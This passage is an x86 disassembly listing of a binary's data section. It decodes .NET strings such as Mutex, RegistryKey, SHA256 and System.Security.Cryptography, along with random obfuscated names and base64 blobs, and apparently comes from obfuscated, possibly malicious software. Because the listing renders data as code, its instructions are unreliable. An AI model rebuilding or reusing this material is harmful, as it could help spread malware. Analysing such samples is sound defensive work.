  4098cd:	6a 54                	push   $0x54
  4098cf:	4a                   	dec    %edx
  4098d0:	77 00                	ja     0x4098d2
  4098d2:	6a 69                	push   $0x69
  4098d4:	7a 46                	jp     0x40991c
  4098d6:	52                   	push   %edx
  4098d7:	42                   	inc    %edx
  4098d8:	43                   	inc    %ebx
  4098d9:	7a 58                	jp     0x409933
  4098db:	59                   	pop    %ecx
  4098dc:	4d                   	dec    %ebp
  4098dd:	4c                   	dec    %esp
  4098de:	77 00                	ja     0x4098e0
  4098e0:	49                   	dec    %ecx
  4098e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4098e2:	61                   	popa
  4098e3:	73 72                	jae    0x409957
  4098e5:	77 68                	ja     0x40994f
  4098e7:	43                   	inc    %ebx
  4098e8:	49                   	dec    %ecx
  4098e9:	50                   	push   %eax
  4098ea:	77 00                	ja     0x4098ec
  4098ec:	46                   	inc    %esi
  4098ed:	6b 52 61 64          	imul   $0x64,0x61(%edx),%edx
  4098f1:	78 4d                	js     0x409940
  4098f3:	73 69                	jae    0x40995e
  4098f5:	42                   	inc    %edx
  4098f6:	59                   	pop    %ecx
  4098f7:	77 00                	ja     0x4098f9
  4098f9:	73 63                	jae    0x40995e
  4098fb:	73 54                	jae    0x409951
  4098fd:	79 48                	jns    0x409947
  4098ff:	5a                   	pop    %edx
  409900:	6d                   	insl   (%dx),%es:(%edi)
  409901:	68 6e 61 68 77       	push   $0x7768616e
  409906:	00 4d 4d             	add    %cl,0x4d(%ebp)
  409909:	62 4a 74             	bound  %ecx,0x74(%edx)
  40990c:	65 6f                	outsl  %gs:(%esi),(%dx)
  40990e:	57                   	push   %edi
  40990f:	42                   	inc    %edx
  409910:	4f                   	dec    %edi
  409911:	48                   	dec    %eax
  409912:	63 6a 77             	arpl   %ebp,0x77(%edx)
  409915:	00 74 41 6d          	add    %dh,0x6d(%ecx,%eax,2)
  409919:	42                   	inc    %edx
  40991a:	73 64                	jae    0x409980
  40991c:	65 6b 47 5a 6b       	imul   $0x6b,%gs:0x5a(%edi),%eax
  409921:	77 00                	ja     0x409923
  409923:	5a                   	pop    %edx
  409924:	4b                   	dec    %ebx
  409925:	72 56                	jb     0x40997d
  409927:	74 74                	je     0x40999d
  409929:	58                   	pop    %eax
  40992a:	57                   	push   %edi
  40992b:	6a 6b                	push   $0x6b
  40992d:	62 63 6b             	bound  %esp,0x6b(%ebx)
  409930:	77 00                	ja     0x409932
  409932:	6c                   	insb   (%dx),%es:(%edi)
  409933:	6d                   	insl   (%dx),%es:(%edi)
  409934:	42                   	inc    %edx
  409935:	71 71                	jno    0x4099a8
  409937:	59                   	pop    %ecx
  409938:	59                   	pop    %ecx
  409939:	6f                   	outsl  %ds:(%esi),(%dx)
  40993a:	6d                   	insl   (%dx),%es:(%edi)
  40993b:	77 00                	ja     0x40993d
  40993d:	63 45 52             	arpl   %eax,0x52(%ebp)
  409940:	65 6b 42 57 75       	imul   $0x75,%gs:0x57(%edx),%eax
  409945:	41                   	inc    %ecx
  409946:	61                   	popa
  409947:	6f                   	outsl  %ds:(%esi),(%dx)
  409948:	77 00                	ja     0x40994a
  40994a:	73 65                	jae    0x4099b1
  40994c:	74 5f                	je     0x4099ad
  40994e:	43                   	inc    %ebx
  40994f:	72 65                	jb     0x4099b6
  409951:	61                   	popa
  409952:	74 65                	je     0x4099b9
  409954:	4e                   	dec    %esi
  409955:	6f                   	outsl  %ds:(%esi),(%dx)
  409956:	57                   	push   %edi
  409957:	69 6e 64 6f 77 00 56 	imul   $0x5600776f,0x64(%esi),%ebp
  40995e:	79 79                	jns    0x4099d9
  409960:	42                   	inc    %edx
  409961:	50                   	push   %eax
  409962:	42                   	inc    %edx
  409963:	46                   	inc    %esi
  409964:	57                   	push   %edi
  409965:	5a                   	pop    %edx
  409966:	61                   	popa
  409967:	44                   	inc    %esp
  409968:	78 00                	js     0x40996a
  40996a:	70 75                	jo     0x4099e1
  40996c:	67 54                	addr16 push %esp
  40996e:	50                   	push   %eax
  40996f:	57                   	push   %edi
  409970:	69 4f 5a 43 55 68 6b 	imul   $0x6b685543,0x5a(%edi),%ecx
  409977:	4b                   	dec    %ebx
  409978:	78 00                	js     0x40997a
  40997a:	73 6c                	jae    0x4099e8
  40997c:	4f                   	dec    %edi
  40997d:	74 63                	je     0x4099e2
  40997f:	4c                   	dec    %esp
  409980:	43                   	inc    %ebx
  409981:	44                   	inc    %esp
  409982:	6b 4e 53 78          	imul   $0x78,0x53(%esi),%ecx
  409986:	00 58 66             	add    %bl,0x66(%eax)
  409989:	6e                   	outsb  %ds:(%esi),(%dx)
  40998a:	48                   	dec    %eax
  40998b:	59                   	pop    %ecx
  40998c:	79 57                	jns    0x4099e5
  40998e:	56                   	push   %esi
  40998f:	49                   	dec    %ecx
  409990:	4d                   	dec    %ebp
  409991:	58                   	pop    %eax
  409992:	78 00                	js     0x409994
  409994:	4c                   	dec    %esp
  409995:	58                   	pop    %eax
  409996:	45                   	inc    %ebp
  409997:	71 53                	jno    0x4099ec
  409999:	7a 43                	jp     0x4099de
  40999b:	62 54 43 4a          	bound  %edx,0x4a(%ebx,%eax,2)
  40999f:	63 78 00             	arpl   %edi,0x0(%eax)
  4099a2:	4d                   	dec    %ebp
  4099a3:	75 74                	jne    0x409a19
  4099a5:	65 78 00             	gs js  0x4099a8
  4099a8:	58                   	pop    %eax
  4099a9:	4c                   	dec    %esp
  4099aa:	70 6e                	jo     0x409a1a
  4099ac:	79 6e                	jns    0x409a1c
  4099ae:	68 7a 78 55 76       	push   $0x7655787a
  4099b3:	6a 72                	push   $0x72
  4099b5:	78 00                	js     0x4099b7
  4099b7:	42                   	inc    %edx
  4099b8:	43                   	inc    %ebx
  4099b9:	64 71 43             	fs jno 0x4099ff
  4099bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4099bd:	62 47 64             	bound  %eax,0x64(%edi)
  4099c0:	71 63                	jno    0x409a25
  4099c2:	43                   	inc    %ebx
  4099c3:	79 00                	jns    0x4099c5
  4099c5:	4d                   	dec    %ebp
  4099c6:	4c                   	dec    %esp
  4099c7:	5a                   	pop    %edx
  4099c8:	4a                   	dec    %edx
  4099c9:	69 4b 54 44 44 56 4f 	imul   $0x4f564444,0x54(%ebx),%ecx
  4099d0:	4b                   	dec    %ebx
  4099d1:	44                   	inc    %esp
  4099d2:	79 00                	jns    0x4099d4
  4099d4:	42                   	inc    %edx
  4099d5:	50                   	push   %eax
  4099d6:	48                   	dec    %eax
  4099d7:	68 63 47 6f 6c       	push   $0x6c6f4763
  4099dc:	79 63                	jns    0x409a41
  4099de:	52                   	push   %edx
  4099df:	7a 4a                	jp     0x409a2b
  4099e1:	79 00                	jns    0x4099e3
  4099e3:	49                   	dec    %ecx
  4099e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4099e5:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  4099ec:	65 
  4099ed:	41                   	inc    %ecx
  4099ee:	72 72                	jb     0x409a62
  4099f0:	61                   	popa
  4099f1:	79 00                	jns    0x4099f3
  4099f3:	54                   	push   %esp
  4099f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4099f5:	41                   	inc    %ecx
  4099f6:	72 72                	jb     0x409a6a
  4099f8:	61                   	popa
  4099f9:	79 00                	jns    0x4099fb
  4099fb:	67 65 74 5f          	addr16 gs je 0x409a5e
  4099ff:	41                   	inc    %ecx
  409a00:	73 41                	jae    0x409a43
  409a02:	72 72                	jb     0x409a76
  409a04:	61                   	popa
  409a05:	79 00                	jns    0x409a07
  409a07:	67 65 74 5f          	addr16 gs je 0x409a6a
  409a0b:	4b                   	dec    %ebx
  409a0c:	65 79 00             	gs jns 0x409a0f
  409a0f:	73 65                	jae    0x409a76
  409a11:	74 5f                	je     0x409a72
  409a13:	4b                   	dec    %ebx
  409a14:	65 79 00             	gs jns 0x409a17
  409a17:	43                   	inc    %ebx
  409a18:	72 65                	jb     0x409a7f
  409a1a:	61                   	popa
  409a1b:	74 65                	je     0x409a82
  409a1d:	53                   	push   %ebx
  409a1e:	75 62                	jne    0x409a82
  409a20:	4b                   	dec    %ebx
  409a21:	65 79 00             	gs jns 0x409a24
  409a24:	4f                   	dec    %edi
  409a25:	70 65                	jo     0x409a8c
  409a27:	6e                   	outsb  %ds:(%esi),(%dx)
  409a28:	53                   	push   %ebx
  409a29:	75 62                	jne    0x409a8d
  409a2b:	4b                   	dec    %ebx
  409a2c:	65 79 00             	gs jns 0x409a2f
  409a2f:	67 65 74 5f          	addr16 gs je 0x409a92
  409a33:	50                   	push   %eax
  409a34:	75 62                	jne    0x409a98
  409a36:	6c                   	insb   (%dx),%es:(%edi)
  409a37:	69 63 4b 65 79 00 52 	imul   $0x52007965,0x4b(%ebx),%esp
  409a3e:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409a45:	4b 65 
  409a47:	79 00                	jns    0x409a49
  409a49:	53                   	push   %ebx
  409a4a:	79 73                	jns    0x409abf
  409a4c:	74 65                	je     0x409ab3
  409a4e:	6d                   	insl   (%dx),%es:(%edi)
  409a4f:	2e 53                	cs push %ebx
  409a51:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409a55:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409a5c:	70 
  409a5d:	74 6f                	je     0x409ace
  409a5f:	67 72 61             	addr16 jb 0x409ac3
  409a62:	70 68                	jo     0x409acc
  409a64:	79 00                	jns    0x409a66
  409a66:	41                   	inc    %ecx
  409a67:	73 73                	jae    0x409adc
  409a69:	65 6d                	gs insl (%dx),%es:(%edi)
  409a6b:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409a6f:	41                   	inc    %ecx
  409a70:	64 64 72 65          	fs fs jb 0x409ad9
  409a74:	73 73                	jae    0x409ae9
  409a76:	46                   	inc    %esi
  409a77:	61                   	popa
  409a78:	6d                   	insl   (%dx),%es:(%edi)
  409a79:	69 6c 79 00 54 6c 70 	imul   $0x46706c54,0x0(%ecx,%edi,2),%ebp
  409a80:	46 
  409a81:	49                   	dec    %ecx
  409a82:	4e                   	dec    %esi
  409a83:	47                   	inc    %edi
  409a84:	4e                   	dec    %esi
  409a85:	6f                   	outsl  %ds:(%esi),(%dx)
  409a86:	73 42                	jae    0x409aca
  409a88:	75 6f                	jne    0x409af9
  409a8a:	79 00                	jns    0x409a8c
  409a8c:	42                   	inc    %edx
  409a8d:	6c                   	insb   (%dx),%es:(%edi)
  409a8e:	6f                   	outsl  %ds:(%esi),(%dx)
  409a8f:	63 6b 43             	arpl   %ebp,0x43(%ebx)
  409a92:	6f                   	outsl  %ds:(%esi),(%dx)
  409a93:	70 79                	jo     0x409b0e
  409a95:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  409a99:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  409aa0:	65 74 5f             	gs je  0x409b02
  409aa3:	53                   	push   %ebx
  409aa4:	79 73                	jns    0x409b19
  409aa6:	74 65                	je     0x409b0d
  409aa8:	6d                   	insl   (%dx),%es:(%edi)
  409aa9:	44                   	inc    %esp
  409aaa:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409ab1:	79 00                	jns    0x409ab3
  409ab3:	52                   	push   %edx
  409ab4:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  409abb:	00 6f 
  409abd:	70 5f                	jo     0x409b1e
  409abf:	45                   	inc    %ebp
  409ac0:	71 75                	jno    0x409b37
  409ac2:	61                   	popa
  409ac3:	6c                   	insb   (%dx),%es:(%edi)
  409ac4:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  409acb:	49 
  409acc:	6e                   	outsb  %ds:(%esi),(%dx)
  409acd:	65 71 75             	gs jno 0x409b45
  409ad0:	61                   	popa
  409ad1:	6c                   	insb   (%dx),%es:(%edi)
  409ad2:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  409ad9:	74 
  409ada:	65 6d                	gs insl (%dx),%es:(%edi)
  409adc:	2e 4e                	cs dec %esi
  409ade:	65 74 2e             	gs je  0x409b0f
  409ae1:	53                   	push   %ebx
  409ae2:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409ae6:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  409aed:	64 
  409aee:	6f                   	outsl  %ds:(%esi),(%dx)
  409aef:	77 73                	ja     0x409b64
  409af1:	49                   	dec    %ecx
  409af2:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409af5:	74 69                	je     0x409b60
  409af7:	74 79                	je     0x409b72
  409af9:	00 49 73             	add    %cl,0x73(%ecx)
  409afc:	4e                   	dec    %esi
  409afd:	75 6c                	jne    0x409b6b
  409aff:	6c                   	insb   (%dx),%es:(%edi)
  409b00:	4f                   	dec    %edi
  409b01:	72 45                	jb     0x409b48
  409b03:	6d                   	insl   (%dx),%es:(%edi)
  409b04:	70 74                	jo     0x409b7a
  409b06:	79 00                	jns    0x409b08
  409b08:	7a 72                	jp     0x409b7c
  409b0a:	42                   	inc    %edx
  409b0b:	6c                   	insb   (%dx),%es:(%edi)
  409b0c:	70 4b                	jo     0x409b59
  409b0e:	59                   	pop    %ecx
  409b0f:	67 75 6e             	addr16 jne 0x409b80
  409b12:	64 63 77 79          	arpl   %esi,%fs:0x79(%edi)
  409b16:	00 6a 6a             	add    %ch,0x6a(%edx)
  409b19:	7a 4a                	jp     0x409b65
  409b1b:	61                   	popa
  409b1c:	5a                   	pop    %edx
  409b1d:	41                   	inc    %ecx
  409b1e:	6d                   	insl   (%dx),%es:(%edi)
  409b1f:	70 55                	jo     0x409b76
  409b21:	7a 00                	jp     0x409b23
  409b23:	4d                   	dec    %ebp
  409b24:	45                   	inc    %ebp
  409b25:	72 4f                	jb     0x409b76
  409b27:	47                   	inc    %edi
  409b28:	61                   	popa
  409b29:	55                   	push   %ebp
  409b2a:	58                   	pop    %eax
  409b2b:	56                   	push   %esi
  409b2c:	7a 00                	jp     0x409b2e
  409b2e:	6d                   	insl   (%dx),%es:(%edi)
  409b2f:	62 6c 6a 76          	bound  %ebp,0x76(%edx,%ebp,2)
  409b33:	62 55 64             	bound  %edx,0x64(%ebp)
  409b36:	42                   	inc    %edx
  409b37:	4f                   	dec    %edi
  409b38:	58                   	pop    %eax
  409b39:	7a 00                	jp     0x409b3b
  409b3b:	45                   	inc    %ebp
  409b3c:	47                   	inc    %edi
  409b3d:	73 6f                	jae    0x409bae
  409b3f:	4d                   	dec    %ebp
  409b40:	52                   	push   %edx
  409b41:	47                   	inc    %edi
  409b42:	74 42                	je     0x409b86
  409b44:	61                   	popa
  409b45:	5a                   	pop    %edx
  409b46:	7a 00                	jp     0x409b48
  409b48:	67 42                	addr16 inc %edx
  409b4a:	42                   	inc    %edx
  409b4b:	78 7a                	js     0x409bc7
  409b4d:	61                   	popa
  409b4e:	74 75                	je     0x409bc5
  409b50:	78 67                	js     0x409bb9
  409b52:	7a 00                	jp     0x409b54
  409b54:	6f                   	outsl  %ds:(%esi),(%dx)
  409b55:	48                   	dec    %eax
  409b56:	6a 70                	push   $0x70
  409b58:	70 4a                	jo     0x409ba4
  409b5a:	70 75                	jo     0x409bd1
  409b5c:	4f                   	dec    %edi
  409b5d:	49                   	dec    %ecx
  409b5e:	68 7a 00 74 72       	push   $0x7274007a
  409b63:	49                   	dec    %ecx
  409b64:	72 59                	jb     0x409bbf
  409b66:	58                   	pop    %eax
  409b67:	4b                   	dec    %ebx
  409b68:	6e                   	outsb  %ds:(%esi),(%dx)
  409b69:	41                   	inc    %ecx
  409b6a:	52                   	push   %edx
  409b6b:	63 71 7a             	arpl   %esi,0x7a(%ecx)
  409b6e:	00 75 76             	add    %dh,0x76(%ebp)
  409b71:	41                   	inc    %ecx
  409b72:	66 69 63 62 76 4d    	imul   $0x4d76,0x62(%ebx),%sp
  409b78:	77 6d                	ja     0x409be7
  409b7a:	72 7a                	jb     0x409bf6
  409b7c:	00 65 43             	add    %ah,0x43(%ebp)
  409b7f:	44                   	inc    %esp
  409b80:	4a                   	dec    %edx
  409b81:	6a 72                	push   $0x72
  409b83:	7a 77                	jp     0x409bfc
  409b85:	66 48                	dec    %ax
  409b87:	77 59                	ja     0x409be2
  409b89:	77 7a                	ja     0x409c05
  409b8b:	00 00                	add    %al,(%eax)
  409b8d:	0d 53 00 48 00       	or     $0x480053,%eax
  409b92:	41                   	inc    %ecx
  409b93:	00 32                	add    %dh,(%edx)
  409b95:	00 35 00 36 00 00    	add    %dh,0x3600
  409b9b:	80 d9 50             	sbb    $0x50,%cl
  409b9e:	00 2b                	add    %ch,(%ebx)
  409ba0:	00 6a 00             	add    %ch,0x0(%edx)
  409ba3:	52                   	push   %edx
  409ba4:	00 63 00             	add    %ah,0x0(%ebx)
  409ba7:	70 00                	jo     0x409ba9
  409ba9:	64 00 33             	add    %dh,%fs:(%ebx)
  409bac:	00 74 00 2f          	add    %dh,0x2f(%eax,%eax,1)
  409bb0:	00 46 00             	add    %al,0x0(%esi)
  409bb3:	30 00                	xor    %al,(%eax)
  409bb5:	68 00 51 00 4b       	push   $0x4b005100
  409bba:	00 72 00             	add    %dh,0x0(%edx)
  409bbd:	53                   	push   %ebx
  409bbe:	00 77 00             	add    %dh,0x0(%edi)
  409bc1:	56                   	push   %esi
  409bc2:	00 37                	add    %dh,(%edi)
  409bc4:	00 34 00             	add    %dh,(%eax,%eax,1)
  409bc7:	47                   	inc    %edi
  409bc8:	00 62 00             	add    %ah,0x0(%edx)
  409bcb:	35 00 35 00 71       	xor    $0x71003500,%eax
  409bd0:	00 56 00             	add    %dl,0x0(%esi)
  409bd3:	70 00                	jo     0x409bd5
  409bd5:	32 00                	xor    (%eax),%al
  409bd7:	6a 00                	push   $0x0
  409bd9:	32 00                	xor    (%eax),%al
  409bdb:	51                   	push   %ecx
  409bdc:	00 4d 00             	add    %cl,0x0(%ebp)
  409bdf:	64 00 38             	add    %bh,%fs:(%eax)
  409be2:	00 44 00 73          	add    %al,0x73(%eax,%eax,1)
  409be6:	00 55 00             	add    %dl,0x0(%ebp)
  409be9:	57                   	push   %edi
  409bea:	00 2f                	add    %ch,(%edi)
  409bec:	00 72 00             	add    %dh,0x0(%edx)
  409bef:	54                   	push   %esp
  409bf0:	00 53 00             	add    %dl,0x0(%ebx)
  409bf3:	59                   	pop    %ecx
  409bf4:	00 79 00             	add    %bh,0x0(%ecx)
  409bf7:	57                   	push   %edi
  409bf8:	00 47 00             	add    %al,0x0(%edi)
  409bfb:	53                   	push   %ebx
  409bfc:	00 59 00             	add    %bl,0x0(%ecx)
  409bff:	77 00                	ja     0x409c01
  409c01:	66 00 6a 00          	data16 add %ch,0x0(%edx)
  409c05:	70 00                	jo     0x409c07
  409c07:	76 00                	jbe    0x409c09
  409c09:	37                   	aaa
  409c0a:	00 41 00             	add    %al,0x0(%ecx)
  409c0d:	4b                   	dec    %ebx
  409c0e:	00 56 00             	add    %dl,0x0(%esi)
  409c11:	35 00 47 00 57       	xor    $0x57004700,%eax
  409c16:	00 38                	add    %bh,(%eax)
  409c18:	00 67 00             	add    %ah,0x0(%edi)
  409c1b:	32 00                	xor    (%eax),%al
  409c1d:	69 00 2b 00 47 00    	imul   $0x47002b,(%eax),%eax
  409c23:	70 00                	jo     0x409c25
  409c25:	39 00                	cmp    %eax,(%eax)
  409c27:	57                   	push   %edi
  409c28:	00 41 00             	add    %al,0x0(%ecx)
  409c2b:	71 00                	jno    0x409c2d
  409c2d:	64 00 44 00 49       	add    %al,%fs:0x49(%eax,%eax,1)
  409c32:	00 45 00             	add    %al,0x0(%ebp)
  409c35:	6a 00                	push   $0x0
  409c37:	76 00                	jbe    0x409c39
  409c39:	33 00                	xor    (%eax),%eax
  409c3b:	55                   	push   %ebp
  409c3c:	00 33                	add    %dh,(%ebx)
  409c3e:	00 6a 00             	add    %ch,0x0(%edx)
  409c41:	6c                   	insb   (%dx),%es:(%edi)
  409c42:	00 4b 00             	add    %cl,0x0(%ebx)
  409c45:	33 00                	xor    (%eax),%eax
  409c47:	55                   	push   %ebp
  409c48:	00 4a 00             	add    %cl,0x0(%edx)
  409c4b:	48                   	dec    %eax
  409c4c:	00 53 00             	add    %dl,0x0(%ebx)
  409c4f:	67 00 6f 00          	add    %ch,0x0(%bx)
  409c53:	54                   	push   %esp
  409c54:	00 38                	add    %bh,(%eax)
  409c56:	00 35 00 31 00 48    	add    %dh,0x48003100
  409c5c:	00 66 00             	add    %ah,0x0(%esi)
  409c5f:	6c                   	insb   (%dx),%es:(%edi)
  409c60:	00 71 00             	add    %dh,0x0(%ecx)
  409c63:	73 00                	jae    0x409c65
  409c65:	54                   	push   %esp
  409c66:	00 69 00             	add    %ch,0x0(%ecx)
  409c69:	4e                   	dec    %esi
  409c6a:	00 6e 00             	add    %ch,0x0(%esi)
  409c6d:	5a                   	pop    %edx
  409c6e:	00 41 00             	add    %al,0x0(%ecx)
  409c71:	73 00                	jae    0x409c73
  409c73:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  409c78:	7a 00                	jp     0x409c7a
  409c7a:	69 00 2b 00 69 00    	imul   $0x69002b,(%eax),%eax
  409c80:	53                   	push   %ebx
  409c81:	00 49 00             	add    %cl,0x0(%ecx)
  409c84:	31 00                	xor    %eax,(%eax)
  409c86:	33 00                	xor    (%eax),%eax
  409c88:	33 00                	xor    (%eax),%eax
  409c8a:	79 00                	jns    0x409c8c
  409c8c:	70 00                	jo     0x409c8e
  409c8e:	68 00 32 00 7a       	push   $0x7a003200
  409c93:	00 77 00             	add    %dh,0x0(%edi)
  409c96:	62 00                	bound  %eax,(%eax)
  409c98:	72 00                	jb     0x409c9a
  409c9a:	68 00 68 00 78       	push   $0x78006800
  409c9f:	00 39                	add    %bh,(%ecx)
  409ca1:	00 53 00             	add    %dl,0x0(%ebx)
  409ca4:	2f                   	das
  409ca5:	00 49 00             	add    %cl,0x0(%ecx)
  409ca8:	31 00                	xor    %eax,(%eax)
  409caa:	4a                   	dec    %edx
  409cab:	00 44 00 75          	add    %al,0x75(%eax,%eax,1)
  409caf:	00 37                	add    %dh,(%edi)
  409cb1:	00 4a 00             	add    %cl,0x0(%edx)
  409cb4:	2b 00                	sub    (%eax),%eax
  409cb6:	6c                   	insb   (%dx),%es:(%edi)
  409cb7:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
  409cbb:	00 42 00             	add    %al,0x0(%edx)
  409cbe:	68 00 49 00 55       	push   $0x55004900
  409cc3:	00 6f 00             	add    %ch,0x0(%edi)
  409cc6:	61                   	popa
  409cc7:	00 4e 00             	add    %cl,0x0(%esi)
  409cca:	54                   	push   %esp
  409ccb:	00 71 00             	add    %dh,0x0(%ecx)
  409cce:	68 00 43 00 48       	push   $0x48004300
  409cd3:	00 43 00             	add    %al,0x0(%ebx)
  409cd6:	75 00                	jne    0x409cd8
  409cd8:	69 00 55 00 4b 00    	imul   $0x4b0055,(%eax),%eax
  409cde:	57                   	push   %edi
  409cdf:	00 53 00             	add    %dl,0x0(%ebx)
  409ce2:	4f                   	dec    %edi
  409ce3:	00 54 00 79          	add    %dl,0x79(%eax,%eax,1)
  409ce7:	00 6e 00             	add    %ch,0x0(%esi)
  409cea:	6c                   	insb   (%dx),%es:(%edi)
  409ceb:	00 76 00             	add    %dh,0x0(%esi)
  409cee:	32 00                	xor    (%eax),%al
  409cf0:	36 00 46 00          	add    %al,%ss:0x0(%esi)
  409cf4:	57                   	push   %edi
  409cf5:	00 4e 00             	add    %cl,0x0(%esi)
  409cf8:	4d                   	dec    %ebp
  409cf9:	00 38                	add    %bh,(%eax)
  409cfb:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  409cff:	00 4b 00             	add    %cl,0x0(%ebx)
  409d02:	34 00                	xor    $0x0,%al
  409d04:	71 00                	jno    0x409d06
  409d06:	2b 00                	sub    (%eax),%eax
  409d08:	73 00                	jae    0x409d0a
  409d0a:	54                   	push   %esp
  409d0b:	00 4c 00 74          	add    %cl,0x74(%eax,%eax,1)
  409d0f:	00 4e 00             	add    %cl,0x0(%esi)
  409d12:	50                   	push   %eax
  409d13:	00 48 00             	add    %cl,0x0(%eax)
  409d16:	48                   	dec    %eax
  409d17:	00 31                	add    %dh,(%ecx)
  409d19:	00 62 00             	add    %ah,0x0(%edx)
  409d1c:	63 00                	arpl   %eax,(%eax)
  409d1e:	45                   	inc    %ebp
  409d1f:	00 32                	add    %dh,(%edx)
  409d21:	00 51 00             	add    %dl,0x0(%ecx)
  409d24:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409d29:	80 b1 67 00 66 00 62 	xorb   $0x62,0x660067(%ecx)
  409d30:	00 56 00             	add    %dl,0x0(%esi)
  409d33:	4b                   	dec    %ebx
  409d34:	00 4a 00             	add    %cl,0x0(%edx)
  409d37:	41                   	inc    %ecx
  409d38:	00 61 00             	add    %ah,0x0(%ecx)
  409d3b:	72 00                	jb     0x409d3d
  409d3d:	64 00 6c 00 51       	add    %ch,%fs:0x51(%eax,%eax,1)
  409d42:	00 71 00             	add    %dh,0x0(%ecx)
  409d45:	56                   	push   %esi
  409d46:	00 31                	add    %dh,(%ecx)
  409d48:	00 39                	add    %bh,(%ecx)
  409d4a:	00 39                	add    %bh,(%ecx)
  409d4c:	00 50 00             	add    %dl,0x0(%eax)
  409d4f:	2b 00                	sub    (%eax),%eax
  409d51:	63 00                	arpl   %eax,(%eax)
  409d53:	38 00                	cmp    %al,(%eax)
  409d55:	65 00 7a 00          	add    %bh,%gs:0x0(%edx)
  409d59:	72 00                	jb     0x409d5b
  409d5b:	59                   	pop    %ecx
  409d5c:	00 72 00             	add    %dh,0x0(%edx)
  409d5f:	59                   	pop    %ecx
  409d60:	00 7a 00             	add    %bh,0x0(%edx)
  409d63:	2b 00                	sub    (%eax),%eax
  409d65:	4a                   	dec    %edx
  409d66:	00 46 00             	add    %al,0x0(%esi)
  409d69:	38 00                	cmp    %al,(%eax)
  409d6b:	7a 00                	jp     0x409d6d
  409d6d:	4e                   	dec    %esi
  409d6e:	00 76 00             	add    %dh,0x0(%esi)
  409d71:	50                   	push   %eax
  409d72:	00 56 00             	add    %dl,0x0(%esi)
  409d75:	76 00                	jbe    0x409d77
  409d77:	6c                   	insb   (%dx),%es:(%edi)
  409d78:	00 53 00             	add    %dl,0x0(%ebx)
  409d7b:	32 00                	xor    (%eax),%al
  409d7d:	6f                   	outsl  %ds:(%esi),(%dx)
  409d7e:	00 32                	add    %dh,(%edx)
  409d80:	00 6b 00             	add    %ch,0x0(%ebx)
  409d83:	79 00                	jns    0x409d85
  409d85:	5a                   	pop    %edx
  409d86:	00 38                	add    %bh,(%eax)
  409d88:	00 79 00             	add    %bh,0x0(%ecx)
  409d8b:	78 00                	js     0x409d8d
  409d8d:	49                   	dec    %ecx
  409d8e:	00 66 00             	add    %ah,0x0(%esi)
  409d91:	57                   	push   %edi
  409d92:	00 47 00             	add    %al,0x0(%edi)
  409d95:	6a 00                	push   $0x0
  409d97:	44                   	inc    %esp
  409d98:	00 66 00             	add    %ah,0x0(%esi)
  409d9b:	33 00                	xor    (%eax),%eax
  409d9d:	52                   	push   %edx
  409d9e:	00 68 00             	add    %ch,0x0(%eax)
  409da1:	46                   	inc    %esi
  409da2:	00 31                	add    %dh,(%ecx)
  409da4:	00 39                	add    %bh,(%ecx)
  409da6:	00 42 00             	add    %al,0x0(%edx)
  409da9:	51                   	push   %ecx
  409daa:	00 4a 00             	add    %cl,0x0(%edx)
  409dad:	67 00 4e 00          	add    %cl,0x0(%bp)
  409db1:	4f                   	dec    %edi
  409db2:	00 43 00             	add    %al,0x0(%ebx)
  409db5:	6d                   	insl   (%dx),%es:(%edi)
  409db6:	00 54 00 78          	add    %dl,0x78(%eax,%eax,1)
  409dba:	00 50 00             	add    %dl,0x0(%eax)
  409dbd:	6d                   	insl   (%dx),%es:(%edi)
  409dbe:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
  409dc2:	00 42 00             	add    %al,0x0(%edx)
  409dc5:	6e                   	outsb  %ds:(%esi),(%dx)
  409dc6:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  409dca:	00 5a 00             	add    %bl,0x0(%edx)
  409dcd:	4d                   	dec    %ebp
  409dce:	00 35 00 58 00 6b    	add    %dh,0x6b005800
  409dd4:	00 41 00             	add    %al,0x0(%ecx)
  409dd7:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409ddc:	80 b1 4d 00 41 00 38 	xorb   $0x38,0x41004d(%ecx)
  409de3:	00 41 00             	add    %al,0x0(%ecx)
  409de6:	51                   	push   %ecx
  409de7:	00 64 00 71          	add    %ah,0x71(%eax,%eax,1)
  409deb:	00 77 00             	add    %dh,0x0(%edi)
  409dee:	4e                   	dec    %esi
  409def:	00 62 00             	add    %ah,0x0(%edx)
  409df2:	61                   	popa
  409df3:	00 59 00             	add    %bl,0x0(%ecx)
  409df6:	7a 00                	jp     0x409df8
  409df8:	4a                   	dec    %edx
  409df9:	00 72 00             	add    %dh,0x0(%edx)
  409dfc:	61                   	popa
  409dfd:	00 54 00 75          	add    %dl,0x75(%eax,%eax,1)
  409e01:	00 32                	add    %dh,(%edx)
  409e03:	00 69 00             	add    %ch,0x0(%ecx)
  409e06:	45                   	inc    %ebp
  409e07:	00 6a 00             	add    %ch,0x0(%edx)
  409e0a:	52                   	push   %edx
  409e0b:	00 59 00             	add    %bl,0x0(%ecx)
  409e0e:	7a 00                	jp     0x409e10
